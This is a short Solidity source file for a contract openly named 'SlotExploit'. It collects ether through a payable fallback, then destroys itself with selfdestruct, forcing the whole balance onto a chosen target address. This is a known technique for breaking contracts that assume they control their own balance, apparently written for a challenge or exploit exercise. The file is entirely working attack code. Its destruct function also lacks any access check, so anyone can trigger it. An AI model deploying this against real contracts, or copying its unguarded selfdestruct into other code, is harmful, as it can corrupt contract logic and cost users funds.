pragma solidity 0.4.24;


contract SlotExploit {
    
    address public owner;
    address public send_addr;

    constructor(address addr) public {
        owner = msg.sender;
        send_addr = addr;
    }
    
    function () payable external {

    }
    
    function selfdest() public {
        selfdestruct(send_addr);
    }
}
